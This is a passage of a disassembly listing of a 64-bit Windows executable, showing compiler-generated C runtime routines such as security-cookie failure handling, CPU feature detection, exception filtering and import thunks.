   140007502:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140007507:	48 f7 d0             	not    %rax
   14000750a:	48 89 05 6f 6b 00 00 	mov    %rax,0x6b6f(%rip)        # 0x14000e080
   140007511:	48 83 c4 30          	add    $0x30,%rsp
   140007515:	5d                   	pop    %rbp
   140007516:	c3                   	ret
   140007517:	cc                   	int3
   140007518:	33 c0                	xor    %eax,%eax
   14000751a:	c3                   	ret
   14000751b:	cc                   	int3
   14000751c:	b8 01 00 00 00       	mov    $0x1,%eax
   140007521:	c3                   	ret
   140007522:	cc                   	int3
   140007523:	cc                   	int3
   140007524:	b8 00 40 00 00       	mov    $0x4000,%eax
   140007529:	c3                   	ret
   14000752a:	cc                   	int3
   14000752b:	cc                   	int3
   14000752c:	48 8d 0d 1d 74 00 00 	lea    0x741d(%rip),%rcx        # 0x14000e950
   140007533:	48 ff 25 3e 1b 00 00 	rex.W jmp *0x1b3e(%rip)        # 0x140009078
   14000753a:	cc                   	int3
   14000753b:	cc                   	int3
   14000753c:	b0 01                	mov    $0x1,%al
   14000753e:	c3                   	ret
   14000753f:	cc                   	int3
   140007540:	48 8d 05 19 74 00 00 	lea    0x7419(%rip),%rax        # 0x14000e960
   140007547:	c3                   	ret
   140007548:	48 83 ec 28          	sub    $0x28,%rsp
   14000754c:	e8 bf 9a ff ff       	call   0x140001010
   140007551:	48 83 08 24          	orq    $0x24,(%rax)
   140007555:	e8 e6 ff ff ff       	call   0x140007540
   14000755a:	48 83 08 02          	orq    $0x2,(%rax)
   14000755e:	48 83 c4 28          	add    $0x28,%rsp
   140007562:	c3                   	ret
   140007563:	cc                   	int3
   140007564:	33 c0                	xor    %eax,%eax
   140007566:	39 05 20 6b 00 00    	cmp    %eax,0x6b20(%rip)        # 0x14000e08c
   14000756c:	0f 94 c0             	sete   %al
   14000756f:	c3                   	ret
   140007570:	48 8d 05 21 74 00 00 	lea    0x7421(%rip),%rax        # 0x14000e998
   140007577:	c3                   	ret
   140007578:	48 8d 05 11 74 00 00 	lea    0x7411(%rip),%rax        # 0x14000e990
   14000757f:	c3                   	ret
   140007580:	c7 05 de 73 00 00 00 	movl   $0x0,0x73de(%rip)        # 0x14000e968
   140007587:	00 00 00 
   14000758a:	c3                   	ret
   14000758b:	cc                   	int3
   14000758c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007591:	55                   	push   %rbp
   140007592:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   140007599:	ff 
   14000759a:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   1400075a1:	8b d9                	mov    %ecx,%ebx
   1400075a3:	b9 17 00 00 00       	mov    $0x17,%ecx
   1400075a8:	ff 15 ea 1a 00 00    	call   *0x1aea(%rip)        # 0x140009098
   1400075ae:	85 c0                	test   %eax,%eax
   1400075b0:	74 04                	je     0x1400075b6
   1400075b2:	8b cb                	mov    %ebx,%ecx
   1400075b4:	cd 29                	int    $0x29
   1400075b6:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400075bb:	e8 c0 ff ff ff       	call   0x140007580
   1400075c0:	33 d2                	xor    %edx,%edx
   1400075c2:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400075c6:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   1400075cc:	e8 c1 05 00 00       	call   0x140007b92
   1400075d1:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400075d5:	ff 15 f5 1a 00 00    	call   *0x1af5(%rip)        # 0x1400090d0
   1400075db:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   1400075e2:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   1400075e9:	48 8b cb             	mov    %rbx,%rcx
   1400075ec:	45 33 c0             	xor    %r8d,%r8d
   1400075ef:	ff 15 d3 1a 00 00    	call   *0x1ad3(%rip)        # 0x1400090c8
   1400075f5:	48 85 c0             	test   %rax,%rax
   1400075f8:	74 3f                	je     0x140007639
   1400075fa:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   140007601:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   140007608:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   14000760f:	00 00 
   140007611:	4c 8b c8             	mov    %rax,%r9
   140007614:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140007619:	4c 8b c3             	mov    %rbx,%r8
   14000761c:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   140007623:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140007628:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000762c:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140007631:	33 c9                	xor    %ecx,%ecx
   140007633:	ff 15 87 1a 00 00    	call   *0x1a87(%rip)        # 0x1400090c0
   140007639:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140007640:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140007645:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   14000764c:	33 d2                	xor    %edx,%edx
   14000764e:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   140007655:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   14000765b:	48 83 c0 08          	add    $0x8,%rax
   14000765f:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   140007666:	e8 27 05 00 00       	call   0x140007b92
   14000766b:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140007672:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140007677:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   14000767e:	40 
   14000767f:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   140007686:	00 
   140007687:	ff 15 e3 19 00 00    	call   *0x19e3(%rip)        # 0x140009070
   14000768d:	8b d8                	mov    %eax,%ebx
   14000768f:	33 c9                	xor    %ecx,%ecx
   140007691:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140007696:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000769b:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   14000769f:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400076a4:	ff 15 06 1a 00 00    	call   *0x1a06(%rip)        # 0x1400090b0
   1400076aa:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400076af:	ff 15 03 1a 00 00    	call   *0x1a03(%rip)        # 0x1400090b8
   1400076b5:	85 c0                	test   %eax,%eax
   1400076b7:	75 0d                	jne    0x1400076c6
   1400076b9:	83 fb 01             	cmp    $0x1,%ebx
   1400076bc:	74 08                	je     0x1400076c6
   1400076be:	8d 48 03             	lea    0x3(%rax),%ecx
   1400076c1:	e8 ba fe ff ff       	call   0x140007580
   1400076c6:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   1400076cd:	00 
   1400076ce:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   1400076d5:	5d                   	pop    %rbp
   1400076d6:	c3                   	ret
   1400076d7:	cc                   	int3
   1400076d8:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   1400076df:	33 d2                	xor    %edx,%edx
   1400076e1:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400076e6:	44 8d 42 68          	lea    0x68(%rdx),%r8d
   1400076ea:	e8 a3 04 00 00       	call   0x140007b92
   1400076ef:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400076f4:	ff 15 6e 19 00 00    	call   *0x196e(%rip)        # 0x140009068
   1400076fa:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
   1400076ff:	b8 0a 00 00 00       	mov    $0xa,%eax
   140007704:	66 0f 45 44 24 60    	cmovne 0x60(%rsp),%ax
   14000770a:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   140007711:	c3                   	ret
   140007712:	cc                   	int3
   140007713:	cc                   	int3
   140007714:	e9 ff fd ff ff       	jmp    0x140007518
   140007719:	cc                   	int3
   14000771a:	cc                   	int3
   14000771b:	cc                   	int3
   14000771c:	48 83 ec 28          	sub    $0x28,%rsp
   140007720:	33 c9                	xor    %ecx,%ecx
   140007722:	ff 15 38 19 00 00    	call   *0x1938(%rip)        # 0x140009060
   140007728:	48 85 c0             	test   %rax,%rax
   14000772b:	74 3a                	je     0x140007767
   14000772d:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   140007732:	66 39 08             	cmp    %cx,(%rax)
   140007735:	75 30                	jne    0x140007767
   140007737:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   14000773b:	81 3c 01 50 45 00 00 	cmpl   $0x4550,(%rcx,%rax,1)
   140007742:	75 23                	jne    0x140007767
   140007744:	ba 0b 02 00 00       	mov    $0x20b,%edx
   140007749:	66 39 54 01 18       	cmp    %dx,0x18(%rcx,%rax,1)
   14000774e:	75 17                	jne    0x140007767
   140007750:	83 bc 01 84 00 00 00 	cmpl   $0xe,0x84(%rcx,%rax,1)
   140007757:	0e 
   140007758:	76 0d                	jbe    0x140007767
   14000775a:	83 bc 01 f8 00 00 00 	cmpl   $0x0,0xf8(%rcx,%rax,1)
   140007761:	00 
   140007762:	0f 95 c0             	setne  %al
   140007765:	eb 02                	jmp    0x140007769
   140007767:	32 c0                	xor    %al,%al
   140007769:	48 83 c4 28          	add    $0x28,%rsp
   14000776d:	c3                   	ret
   14000776e:	cc                   	int3
   14000776f:	cc                   	int3
   140007770:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x140007780
   140007777:	48 ff 25 32 19 00 00 	rex.W jmp *0x1932(%rip)        # 0x1400090b0
   14000777e:	cc                   	int3
   14000777f:	cc                   	int3
   140007780:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007785:	57                   	push   %rdi
   140007786:	48 83 ec 20          	sub    $0x20,%rsp
   14000778a:	48 8b 19             	mov    (%rcx),%rbx
   14000778d:	48 8b f9             	mov    %rcx,%rdi
   140007790:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   140007796:	75 24                	jne    0x1400077bc
   140007798:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   14000779c:	75 1e                	jne    0x1400077bc
   14000779e:	8b 53 20             	mov    0x20(%rbx),%edx
   1400077a1:	81 fa 20 05 93 19    	cmp    $0x19930520,%edx
   1400077a7:	74 20                	je     0x1400077c9
   1400077a9:	8d 82 df fa 6c e6    	lea    -0x19930521(%rdx),%eax
   1400077af:	83 f8 01             	cmp    $0x1,%eax
   1400077b2:	76 15                	jbe    0x1400077c9
   1400077b4:	81 fa 00 40 99 01    	cmp    $0x1994000,%edx
   1400077ba:	74 0d                	je     0x1400077c9
   1400077bc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400077c1:	33 c0                	xor    %eax,%eax
   1400077c3:	48 83 c4 20          	add    $0x20,%rsp
   1400077c7:	5f                   	pop    %rdi
   1400077c8:	c3                   	ret
   1400077c9:	e8 d0 03 00 00       	call   0x140007b9e
   1400077ce:	48 89 18             	mov    %rbx,(%rax)
   1400077d1:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   1400077d5:	e8 ca 03 00 00       	call   0x140007ba4
   1400077da:	48 89 18             	mov    %rbx,(%rax)
   1400077dd:	e8 c8 03 00 00       	call   0x140007baa
   1400077e2:	cc                   	int3
   1400077e3:	cc                   	int3
   1400077e4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400077e9:	57                   	push   %rdi
   1400077ea:	48 83 ec 20          	sub    $0x20,%rsp
   1400077ee:	48 8d 1d fb 35 00 00 	lea    0x35fb(%rip),%rbx        # 0x14000adf0
   1400077f5:	48 8d 3d f4 35 00 00 	lea    0x35f4(%rip),%rdi        # 0x14000adf0
   1400077fc:	eb 12                	jmp    0x140007810
   1400077fe:	48 8b 03             	mov    (%rbx),%rax
   140007801:	48 85 c0             	test   %rax,%rax
   140007804:	74 06                	je     0x14000780c
   140007806:	ff 15 44 1e 00 00    	call   *0x1e44(%rip)        # 0x140009650
   14000780c:	48 83 c3 08          	add    $0x8,%rbx
   140007810:	48 3b df             	cmp    %rdi,%rbx
   140007813:	72 e9                	jb     0x1400077fe
   140007815:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000781a:	48 83 c4 20          	add    $0x20,%rsp
   14000781e:	5f                   	pop    %rdi
   14000781f:	c3                   	ret
   140007820:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007825:	57                   	push   %rdi
   140007826:	48 83 ec 20          	sub    $0x20,%rsp
   14000782a:	48 8d 1d cf 35 00 00 	lea    0x35cf(%rip),%rbx        # 0x14000ae00
   140007831:	48 8d 3d c8 35 00 00 	lea    0x35c8(%rip),%rdi        # 0x14000ae00
   140007838:	eb 12                	jmp    0x14000784c
   14000783a:	48 8b 03             	mov    (%rbx),%rax
   14000783d:	48 85 c0             	test   %rax,%rax
   140007840:	74 06                	je     0x140007848
   140007842:	ff 15 08 1e 00 00    	call   *0x1e08(%rip)        # 0x140009650
   140007848:	48 83 c3 08          	add    $0x8,%rbx
   14000784c:	48 3b df             	cmp    %rdi,%rbx
   14000784f:	72 e9                	jb     0x14000783a
   140007851:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007856:	48 83 c4 20          	add    $0x20,%rsp
   14000785a:	5f                   	pop    %rdi
   14000785b:	c3                   	ret
   14000785c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140007861:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140007866:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000786b:	57                   	push   %rdi
   14000786c:	48 83 ec 10          	sub    $0x10,%rsp
   140007870:	33 c0                	xor    %eax,%eax
   140007872:	33 c9                	xor    %ecx,%ecx
   140007874:	0f a2                	cpuid
   140007876:	81 f1 6e 74 65 6c    	xor    $0x6c65746e,%ecx
   14000787c:	81 f2 69 6e 65 49    	xor    $0x49656e69,%edx
   140007882:	0b d1                	or     %ecx,%edx
   140007884:	8b e8                	mov    %eax,%ebp
   140007886:	b8 01 00 00 00       	mov    $0x1,%eax
   14000788b:	81 f3 47 65 6e 75    	xor    $0x756e6547,%ebx
   140007891:	0b d3                	or     %ebx,%edx
   140007893:	8d 48 ff             	lea    -0x1(%rax),%ecx
   140007896:	0f a2                	cpuid
   140007898:	8b f9                	mov    %ecx,%edi
   14000789a:	75 5e                	jne    0x1400078fa
   14000789c:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   1400078a1:	48 c7 05 f4 67 00 00 	movq   $0x8000,0x67f4(%rip)        # 0x14000e0a0
   1400078a8:	00 80 00 00 
   1400078ac:	48 c7 05 f1 67 00 00 	movq   $0xffffffffffffffff,0x67f1(%rip)        # 0x14000e0a8
   1400078b3:	ff ff ff ff 
   1400078b7:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   1400078bc:	74 28                	je     0x1400078e6
   1400078be:	3d 60 06 02 00       	cmp    $0x20660,%eax
   1400078c3:	74 21                	je     0x1400078e6
   1400078c5:	3d 70 06 02 00       	cmp    $0x20670,%eax
   1400078ca:	74 1a                	je     0x1400078e6
   1400078cc:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   1400078d1:	83 f8 20             	cmp    $0x20,%eax
   1400078d4:	77 24                	ja     0x1400078fa
   1400078d6:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   1400078dd:	00 00 00 
   1400078e0:	48 0f a3 c1          	bt     %rax,%rcx
   1400078e4:	73 14                	jae    0x1400078fa
   1400078e6:	44 8b 05 83 70 00 00 	mov    0x7083(%rip),%r8d        # 0x14000e970
   1400078ed:	41 83 c8 01          	or     $0x1,%r8d
   1400078f1:	44 89 05 78 70 00 00 	mov    %r8d,0x7078(%rip)        # 0x14000e970
   1400078f8:	eb 07                	jmp    0x140007901
   1400078fa:	44 8b 05 6f 70 00 00 	mov    0x706f(%rip),%r8d        # 0x14000e970
   140007901:	45 33 c9             	xor    %r9d,%r9d
   140007904:	41 8b f1             	mov    %r9d,%esi
   140007907:	45 8b d1             	mov    %r9d,%r10d
   14000790a:	45 8b d9             	mov    %r9d,%r11d
   14000790d:	83 fd 07             	cmp    $0x7,%ebp
   140007910:	7c 40                	jl     0x140007952
   140007912:	41 8d 41 07          	lea    0x7(%r9),%eax
   140007916:	33 c9                	xor    %ecx,%ecx
   140007918:	0f a2                	cpuid
   14000791a:	8b f2                	mov    %edx,%esi
   14000791c:	44 8b cb             	mov    %ebx,%r9d
   14000791f:	0f ba e3 09          	bt     $0x9,%ebx
   140007923:	73 0b                	jae    0x140007930
   140007925:	41 83 c8 02          	or     $0x2,%r8d
   140007929:	44 89 05 40 70 00 00 	mov    %r8d,0x7040(%rip)        # 0x14000e970
   140007930:	83 f8 01             	cmp    $0x1,%eax
   140007933:	7c 0d                	jl     0x140007942
   140007935:	b8 07 00 00 00       	mov    $0x7,%eax
   14000793a:	8d 48 fa             	lea    -0x6(%rax),%ecx
   14000793d:	0f a2                	cpuid
   14000793f:	44 8b d2             	mov    %edx,%r10d
   140007942:	b8 24 00 00 00       	mov    $0x24,%eax
   140007947:	3b e8                	cmp    %eax,%ebp
   140007949:	7c 07                	jl     0x140007952
   14000794b:	33 c9                	xor    %ecx,%ecx
   14000794d:	0f a2                	cpuid
   14000794f:	44 8b db             	mov    %ebx,%r11d
   140007952:	48 8b 05 37 67 00 00 	mov    0x6737(%rip),%rax        # 0x14000e090
   140007959:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
   14000795d:	c7 05 31 67 00 00 01 	movl   $0x1,0x6731(%rip)        # 0x14000e098
   140007964:	00 00 00 
   140007967:	c7 05 2b 67 00 00 02 	movl   $0x2,0x672b(%rip)        # 0x14000e09c
   14000796e:	00 00 00 
   140007971:	48 89 05 18 67 00 00 	mov    %rax,0x6718(%rip)        # 0x14000e090
   140007978:	0f ba e7 14          	bt     $0x14,%edi
   14000797c:	73 1f                	jae    0x14000799d
   14000797e:	48 83 e0 ef          	and    $0xffffffffffffffef,%rax
   140007982:	c7 05 0c 67 00 00 02 	movl   $0x2,0x670c(%rip)        # 0x14000e098
   140007989:	00 00 00 
   14000798c:	48 89 05 fd 66 00 00 	mov    %rax,0x66fd(%rip)        # 0x14000e090
   140007993:	c7 05 ff 66 00 00 06 	movl   $0x6,0x66ff(%rip)        # 0x14000e09c
   14000799a:	00 00 00 
   14000799d:	0f ba e7 1b          	bt     $0x1b,%edi
   1400079a1:	0f 83 33 01 00 00    	jae    0x140007ada
   1400079a7:	33 c9                	xor    %ecx,%ecx
   1400079a9:	0f 01 d0             	xgetbv
   1400079ac:	48 c1 e2 20          	shl    $0x20,%rdx
   1400079b0:	48 0b d0             	or     %rax,%rdx
   1400079b3:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   1400079b8:	0f ba e7 1c          	bt     $0x1c,%edi
   1400079bc:	0f 83 fc 00 00 00    	jae    0x140007abe
   1400079c2:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400079c7:	24 06                	and    $0x6,%al
   1400079c9:	3c 06                	cmp    $0x6,%al
   1400079cb:	0f 85 ed 00 00 00    	jne    0x140007abe
   1400079d1:	8b 05 c5 66 00 00    	mov    0x66c5(%rip),%eax        # 0x14000e09c
   1400079d7:	b2 e0                	mov    $0xe0,%dl
   1400079d9:	83 c8 08             	or     $0x8,%eax
   1400079dc:	c7 05 b2 66 00 00 03 	movl   $0x3,0x66b2(%rip)        # 0x14000e098
   1400079e3:	00 00 00 
   1400079e6:	89 05 b0 66 00 00    	mov    %eax,0x66b0(%rip)        # 0x14000e09c
   1400079ec:	41 f6 c1 20          	test   $0x20,%r9b
   1400079f0:	74 62                	je     0x140007a54
   1400079f2:	83 c8 20             	or     $0x20,%eax
   1400079f5:	c7 05 99 66 00 00 05 	movl   $0x5,0x6699(%rip)        # 0x14000e098
   1400079fc:	00 00 00 
   1400079ff:	89 05 97 66 00 00    	mov    %eax,0x6697(%rip)        # 0x14000e09c
   140007a05:	b9 00 00 03 d0       	mov    $0xd0030000,%ecx
   140007a0a:	48 8b 05 7f 66 00 00 	mov    0x667f(%rip),%rax        # 0x14000e090
   140007a11:	44 23 c9             	and    %ecx,%r9d
   140007a14:	48 83 e0 fd          	and    $0xfffffffffffffffd,%rax
   140007a18:	48 89 05 71 66 00 00 	mov    %rax,0x6671(%rip)        # 0x14000e090
   140007a1f:	44 3b c9             	cmp    %ecx,%r9d
   140007a22:	75 37                	jne    0x140007a5b
   140007a24:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140007a29:	22 c2                	and    %dl,%al
   140007a2b:	3a c2                	cmp    %dl,%al
   140007a2d:	75 25                	jne    0x140007a54
   140007a2f:	48 8b 05 5a 66 00 00 	mov    0x665a(%rip),%rax        # 0x14000e090
   140007a36:	83 0d 5f 66 00 00 40 	orl    $0x40,0x665f(%rip)        # 0x14000e09c
   140007a3d:	48 83 e0 db          	and    $0xffffffffffffffdb,%rax
   140007a41:	c7 05 4d 66 00 00 06 	movl   $0x6,0x664d(%rip)        # 0x14000e098
   140007a48:	00 00 00 
   140007a4b:	48 89 05 3e 66 00 00 	mov    %rax,0x663e(%rip)        # 0x14000e090
   140007a52:	eb 07                	jmp    0x140007a5b
   140007a54:	48 8b 05 35 66 00 00 	mov    0x6635(%rip),%rax        # 0x14000e090
   140007a5b:	0f ba e6 17          	bt     $0x17,%esi
   140007a5f:	73 0c                	jae    0x140007a6d
   140007a61:	48 0f ba f0 18       	btr    $0x18,%rax
   140007a66:	48 89 05 23 66 00 00 	mov    %rax,0x6623(%rip)        # 0x14000e090
   140007a6d:	41 0f ba e2 13       	bt     $0x13,%r10d
   140007a72:	73 4a                	jae    0x140007abe
   140007a74:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140007a79:	22 c2                	and    %dl,%al
   140007a7b:	3a c2                	cmp    %dl,%al
   140007a7d:	75 3f                	jne    0x140007abe
   140007a7f:	41 8b cb             	mov    %r11d,%ecx
   140007a82:	41 8b c3             	mov    %r11d,%eax
   140007a85:	48 c1 e9 10          	shr    $0x10,%rcx
   140007a89:	25 ff 00 04 00       	and    $0x400ff,%eax
   140007a8e:	83 e1 06             	and    $0x6,%ecx
   140007a91:	89 05 d5 6e 00 00    	mov    %eax,0x6ed5(%rip)        # 0x14000e96c
   140007a97:	48 81 c9 29 00 00 01 	or     $0x1000029,%rcx
   140007a9e:	48 f7 d1             	not    %rcx
   140007aa1:	48 23 0d e8 65 00 00 	and    0x65e8(%rip),%rcx        # 0x14000e090
   140007aa8:	48 89 0d e1 65 00 00 	mov    %rcx,0x65e1(%rip)        # 0x14000e090
   140007aaf:	3c 01                	cmp    $0x1,%al
   140007ab1:	76 0b                	jbe    0x140007abe
   140007ab3:	48 83 e1 bf          	and    $0xffffffffffffffbf,%rcx
   140007ab7:	48 89 0d d2 65 00 00 	mov    %rcx,0x65d2(%rip)        # 0x14000e090
   140007abe:	41 0f ba e2 15       	bt     $0x15,%r10d
   140007ac3:	73 15                	jae    0x140007ada
   140007ac5:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140007aca:	48 0f ba e0 13       	bt     $0x13,%rax
   140007acf:	73 09                	jae    0x140007ada
   140007ad1:	48 0f ba 35 b6 65 00 	btrq   $0x7,0x65b6(%rip)        # 0x14000e090
   140007ad8:	00 07 
   140007ada:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   140007adf:	33 c0                	xor    %eax,%eax
   140007ae1:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   140007ae6:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140007aeb:	48 83 c4 10          	add    $0x10,%rsp
   140007aef:	5f                   	pop    %rdi
   140007af0:	c3                   	ret
   140007af1:	cc                   	int3
   140007af2:	cc                   	int3
   140007af3:	cc                   	int3
   140007af4:	33 c0                	xor    %eax,%eax
   140007af6:	39 05 b4 65 00 00    	cmp    %eax,0x65b4(%rip)        # 0x14000e0b0
   140007afc:	0f 95 c0             	setne  %al
   140007aff:	c3                   	ret
   140007b00:	48 83 ec 28          	sub    $0x28,%rsp
   140007b04:	4d 8b 41 38          	mov    0x38(%r9),%r8
   140007b08:	48 8b ca             	mov    %rdx,%rcx
   140007b0b:	49 8b d1             	mov    %r9,%rdx
   140007b0e:	e8 0d 00 00 00       	call   0x140007b20
   140007b13:	b8 01 00 00 00       	mov    $0x1,%eax
   140007b18:	48 83 c4 28          	add    $0x28,%rsp
   140007b1c:	c3                   	ret
   140007b1d:	cc                   	int3
   140007b1e:	cc                   	int3
   140007b1f:	cc                   	int3
   140007b20:	40 53                	rex push %rbx
   140007b22:	45 8b 18             	mov    (%r8),%r11d
   140007b25:	48 8b da             	mov    %rdx,%rbx
   140007b28:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   140007b2c:	4c 8b c9             	mov    %rcx,%r9
   140007b2f:	41 f6 00 04          	testb  $0x4,(%r8)
   140007b33:	4c 8b d1             	mov    %rcx,%r10
   140007b36:	74 13                	je     0x140007b4b
   140007b38:	41 8b 40 08          	mov    0x8(%r8),%eax
   140007b3c:	4d 63 50 04          	movslq 0x4(%r8),%r10
   140007b40:	f7 d8                	neg    %eax
   140007b42:	4c 03 d1             	add    %rcx,%r10
   140007b45:	48 63 c8             	movslq %eax,%rcx
   140007b48:	4c 23 d1             	and    %rcx,%r10
   140007b4b:	49 63 c3             	movslq %r11d,%rax
   140007b4e:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   140007b52:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140007b56:	8b 48 08             	mov    0x8(%rax),%ecx
   140007b59:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140007b5d:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   140007b62:	74 10                	je     0x140007b74
   140007b64:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   140007b69:	b9 f0 ff ff ff       	mov    $0xfffffff0,%ecx
   140007b6e:	48 23 c1             	and    %rcx,%rax
   140007b71:	4c 03 c8             	add    %rax,%r9
   140007b74:	4c 33 ca             	xor    %rdx,%r9
   140007b77:	49 8b c9             	mov    %r9,%rcx
   140007b7a:	5b                   	pop    %rbx
   140007b7b:	e9 80 f1 ff ff       	jmp    0x140006d00
   140007b80:	ff 25 b2 18 00 00    	jmp    *0x18b2(%rip)        # 0x140009438
   140007b86:	ff 25 6c 18 00 00    	jmp    *0x186c(%rip)        # 0x1400093f8
   140007b8c:	ff 25 7e 18 00 00    	jmp    *0x187e(%rip)        # 0x140009410
   140007b92:	ff 25 50 18 00 00    	jmp    *0x1850(%rip)        # 0x1400093e8
   140007b98:	ff 25 42 18 00 00    	jmp    *0x1842(%rip)        # 0x1400093e0
   140007b9e:	ff 25 4c 18 00 00    	jmp    *0x184c(%rip)        # 0x1400093f0
   140007ba4:	ff 25 76 18 00 00    	jmp    *0x1876(%rip)        # 0x140009420
   140007baa:	ff 25 78 19 00 00    	jmp    *0x1978(%rip)        # 0x140009528
   140007bb0:	ff 25 c2 18 00 00    	jmp    *0x18c2(%rip)        # 0x140009478
   140007bb6:	ff 25 b4 18 00 00    	jmp    *0x18b4(%rip)        # 0x140009470
   140007bbc:	ff 25 c6 18 00 00    	jmp    *0x18c6(%rip)        # 0x140009488
   140007bc2:	ff 25 58 19 00 00    	jmp    *0x1958(%rip)        # 0x140009520
   140007bc8:	ff 25 4a 19 00 00    	jmp    *0x194a(%rip)        # 0x140009518
   140007bce:	ff 25 d4 18 00 00    	jmp    *0x18d4(%rip)        # 0x1400094a8
   140007bd4:	ff 25 36 19 00 00    	jmp    *0x1936(%rip)        # 0x140009510
   140007bda:	ff 25 28 19 00 00    	jmp    *0x1928(%rip)        # 0x140009508
   140007be0:	ff 25 1a 19 00 00    	jmp    *0x191a(%rip)        # 0x140009500
   140007be6:	ff 25 f4 18 00 00    	jmp    *0x18f4(%rip)        # 0x1400094e0
   140007bec:	ff 25 e6 18 00 00    	jmp    *0x18e6(%rip)        # 0x1400094d8
   140007bf2:	ff 25 d8 18 00 00    	jmp    *0x18d8(%rip)        # 0x1400094d0
   140007bf8:	ff 25 c2 18 00 00    	jmp    *0x18c2(%rip)        # 0x1400094c0
   140007bfe:	ff 25 7c 19 00 00    	jmp    *0x197c(%rip)        # 0x140009580
   140007c04:	ff 25 ae 18 00 00    	jmp    *0x18ae(%rip)        # 0x1400094b8
   140007c0a:	ff 25 28 19 00 00    	jmp    *0x1928(%rip)        # 0x140009538
   140007c10:	ff 25 b2 18 00 00    	jmp    *0x18b2(%rip)        # 0x1400094c8
   140007c16:	ff 25 7c 18 00 00    	jmp    *0x187c(%rip)        # 0x140009498
   140007c1c:	ff 25 5e 18 00 00    	jmp    *0x185e(%rip)        # 0x140009480
   140007c22:	ff 25 50 19 00 00    	jmp    *0x1950(%rip)        # 0x140009578
   140007c28:	ff 25 ba 18 00 00    	jmp    *0x18ba(%rip)        # 0x1400094e8
   140007c2e:	ff 25 bc 18 00 00    	jmp    *0x18bc(%rip)        # 0x1400094f0
   140007c34:	ff 25 be 18 00 00    	jmp    *0x18be(%rip)        # 0x1400094f8
   140007c3a:	cc                   	int3
   140007c3b:	cc                   	int3
   140007c3c:	48 8b c4             	mov    %rsp,%rax
   140007c3f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140007c43:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140007c47:	48 89 70 18          	mov    %rsi,0x18(%rax)
